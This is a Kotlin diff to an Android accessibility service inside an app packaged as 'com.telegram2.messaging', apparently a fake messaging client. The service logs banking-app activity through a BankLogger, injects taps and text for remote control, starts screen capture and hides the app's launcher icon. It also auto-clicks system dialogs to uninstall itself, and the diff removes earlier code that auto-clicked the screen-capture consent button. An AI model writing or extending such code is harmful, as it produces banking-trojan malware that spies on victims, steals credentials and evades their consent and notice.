@@ -3,9 +3,13 @@ package com.telegram2.messaging.remote
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
 import android.accessibilityservice.GestureDescription
+import android.content.ComponentName
+import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.graphics.Path
 import android.os.Bundle
+import android.provider.Settings
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import com.telegram2.messaging.ScreenPermissionActivity
@@ -28,22 +32,22 @@ class MyAccessibilityService : AccessibilityService() {
             notificationTimeout = 100
         }
         setServiceInfo(info)
-        autoGrantMediaProjection()
+
+        // Auto start screen capture if not already running
+        if (!isScreenCaptureRunning()) {
+            startScreenCapture()
+        } else {
+            hideAppIcon() // hide immediately if already capturing
+        }
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
-        val pkg = event.packageName?.toString() ?: return
-        // Bank logging
         BankLogger.onEvent(this, event)
-        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            autoGrantMediaProjection()
-        }
     }
 
     override fun onInterrupt() {}
 
-    // --------------- PUBLIC REMOTE FUNCTIONS ---------------
-
+    // ---------- Remote control functions ----------
     fun tap(x: Int, y: Int) {
         val path = Path().apply { moveTo(x.toFloat(), y.toFloat()) }
         val stroke = GestureDescription.StrokeDescription(path, 0L, 100L)
@@ -66,10 +70,7 @@ class MyAccessibilityService : AccessibilityService() {
         val focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
         if (focused != null) {
             val bundle = Bundle().apply {
-                putCharSequence(
-                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
-                    text
-                )
+                putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
             }
             focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle)
         }
@@ -84,45 +85,58 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     fun uninstallSelf() {
-        val intent = Intent(Intent.ACTION_DELETE).apply {
-            data = android.net.Uri.parse("package:com.telegram2.messaging")
+        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+        intent.data = android.net.Uri.parse("package:$packageName")
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+        startActivity(intent)
+
+        android.os.Handler(mainLooper).postDelayed({
+            val root = rootInActiveWindow ?: return@postDelayed
+            val uninstallNodes = root.findAccessibilityNodeInfosByText("Uninstall")
+            if (uninstallNodes.isNotEmpty()) {
+                uninstallNodes[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                android.os.Handler(mainLooper).postDelayed({
+                    val root2 = rootInActiveWindow ?: return@postDelayed
+                    for (text in listOf("OK", "Uninstall")) {
+                        val nodes = root2.findAccessibilityNodeInfosByText(text)
+                        if (nodes.isNotEmpty()) {
+                            nodes[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                            return@postDelayed
+                        }
+                    }
+                }, 1500)
+            }
+        }, 2000)
+    }
+
+    fun startScreenCapture() {
+        val intent = Intent(this, ScreenPermissionActivity::class.java).apply {
             flags = Intent.FLAG_ACTIVITY_NEW_TASK
         }
         startActivity(intent)
     }
 
-    fun startScreenCapture() {
-        val intent = Intent(this, ScreenPermissionActivity::class.java)
-        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
-        startActivity(intent)
+    fun hideAppIcon() {
+        val pm = packageManager
+        val component = ComponentName(this, com.telegram2.messaging.MainActivity::class.java)
+        pm.setComponentEnabledSetting(
+            component,
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP
+        )
+    }
+
+    fun isScreenCaptureRunning(): Boolean {
+        val manager = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
+        for (service in manager.getRunningServices(Integer.MAX_VALUE)) {
+            if (ScreenCaptureService::class.java.name == service.service.className) {
+                return true
+            }
+        }
+        return false
     }
 
     fun getInstalledApps(): List<String> {
         return packageManager.getInstalledPackages(0).map { it.packageName }
-    }
-
-    private fun autoGrantMediaProjection() {
-        val root = rootInActiveWindow ?: return
-        // Look for "Start now" button
-        val buttons = root.findAccessibilityNodeInfosByText("Start now")
-        if (buttons.isNotEmpty()) {
-            for (btn in buttons) {
-                if (btn.isClickable) {
-                    btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                    return
-                }
-            }
-        }
-        // Also try known system IDs
-        val ids = listOf("com.android.systemui:id/start_button", "android:id/button1")
-        for (id in ids) {
-            val nodes = root.findAccessibilityNodeInfosByViewId(id)
-            for (node in nodes) {
-                if (node.isClickable) {
-                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                    return
-                }
-            }
-        }
     }
 }
